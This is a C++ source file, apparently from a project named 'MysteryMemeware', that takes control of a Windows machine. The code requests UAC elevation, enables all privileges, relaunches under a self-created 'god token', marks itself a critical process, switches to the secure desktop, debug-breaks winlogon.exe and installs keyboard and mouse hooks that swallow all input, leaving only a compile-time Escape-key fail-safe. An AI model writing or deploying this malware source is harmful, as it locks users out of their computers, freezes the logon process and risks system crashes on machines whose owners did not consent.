// Approved 10/26/2024

//#define WaitForDebugger
#define FailSafeEnabled

#include "MysteryControl.h"
#include "Program.h"
#include "EzCpp/EzError.h"
#include "EzCpp/EzTokens.h"
#include "EzCpp/EzWindow.h"
#include "EzCpp/EzHelper.h"
#include <tlhelp32.h>
#include <sddl.h>

static DWORD winLogonPID = 0;
static HANDLE winLogonHandle = INVALID_HANDLE_VALUE;
static void DebugBreakWinLogon() {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snapshot, &processEntry)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	do {
		if (lstrcmpW(processEntry.szExeFile, L"winlogon.exe") == 0) {
			winLogonPID = processEntry.th32ProcessID;
			break;
		}
	} while (Process32Next(snapshot, &processEntry));

	if (!CloseHandle(snapshot)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (winLogonPID == 0) {
		throw EzError(L"WinLogon.exe could not be found in the list of running processes.", __FILE__, __LINE__);
	}

	if (!DebugActiveProcess(winLogonPID)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	winLogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winLogonPID);
	if (winLogonHandle == INVALID_HANDLE_VALUE) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!DebugBreakProcess(winLogonHandle)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}
static void DebugContinueWinLogon() {
	if (!DebugActiveProcessStop(winLogonPID)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	winLogonPID = 0;

	if (!CloseHandle(winLogonHandle)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	winLogonHandle = INVALID_HANDLE_VALUE;
}

static HWINSTA originalStation = NULL;
static HWINSTA primaryStation = NULL;
static HDESK originalDesktop = NULL;
static HDESK secureDesktop = NULL;
static void SetInteractive() {
	originalStation = EzGetCurrentStation();
	primaryStation = EzGetPrimaryStation();
	EzSetProcessStation(primaryStation);

	originalDesktop = EzGetCurrentDesktop();
	secureDesktop = EzGetSecureDesktop();
	EzSetThreadDesktop(secureDesktop);
	EzSwitchToDesktop(secureDesktop);
}
static void FreeInteractivity() {
	EzSetProcessStation(originalStation);
	if (!CloseWindowStation(primaryStation)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	originalStation = NULL;
	primaryStation = NULL;

	EzSwitchToDesktop(originalDesktop);
	if (!SetThreadDesktop(originalDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	if (!CloseDesktop(secureDesktop)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	originalDesktop = NULL;
	secureDesktop = NULL;
}

#ifdef FailSafeEnabled
BOOL failSafeKeyState = FALSE;
LONGLONG failSafeStartTime = 0;
static void UpdateFailSafe() {
	if (failSafeKeyState) {
		LONGLONG timeNow = 0;
		if (!QueryPerformanceCounter(reinterpret_cast<PLARGE_INTEGER>(&timeNow))) {
			EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
		}
		if (failSafeStartTime == 0) {
			failSafeStartTime = timeNow;
		}
		else if (timeNow - failSafeStartTime > 1000) {
			QuitRequested = TRUE;
		}
	}
}
#endif

static HHOOK keyboardHook = NULL;
static HHOOK mouseHook = NULL;
static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
#ifdef FailSafeEnabled
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
		if (wParam == WM_KEYDOWN && pKeyboard->vkCode == VK_ESCAPE) {
			failSafeKeyState = TRUE;
		}
		else if (wParam == WM_KEYUP && pKeyboard->vkCode == VK_ESCAPE) {
			failSafeKeyState = FALSE;
		}
	}
#endif
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
static void SetLLInputHooks()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, NULL);
	if (keyboardHook == NULL) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, NULL);
	if (mouseHook == NULL) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
}
static void UnsetLLInputHooks() {
	if (!UnhookWindowsHookEx(keyboardHook)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	keyboardHook = NULL;

	if (!UnhookWindowsHookEx(mouseHook)) {
		EzError::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	mouseHook = NULL;
}

BOOL InitMysteryControl() {
	HANDLE currentToken = EzOpenCurrentToken();
	EzEnableAllPrivileges(currentToken);

	BOOL isElevated = EzGetTokenElevation(currentToken);
	BOOL isGodToken = EzIsGodToken(currentToken);
	EzCloseHandleSafely(currentToken);

	if (!isElevated) {
		if (!EzLaunchWithUAC()) {
			throw EzError(L"The user declined the UAC. MysteryMemeware cannot proceed without elevation.", __FILE__, __LINE__);
		}
		return TRUE;
	}
	if (!isGodToken) {
		HANDLE godToken = EzCreateGodToken();
		EzLaunchAsToken(godToken);
		return TRUE;
	}

#ifdef WaitForDebugger
	if (!IsDebuggerPresent()) {
		std::cout << "Waiting for debugger..." << std::endl;
	}
	while (!IsDebuggerPresent()) {
		Sleep(100);
	}
#endif

	EzSetProcessCritical(TRUE);

	SetInteractive();

	DebugBreakWinLogon();
	SetLLInputHooks();

	return FALSE;
}
void UpdateMysteryControl() {
	UpdateFailSafe();
	EzMessagePumpAll();
}
void FreeMysteryControl() {
	EzSetProcessCritical(FALSE);

	UnsetLLInputHooks();

	DebugContinueWinLogon();

	FreeInteractivity();
}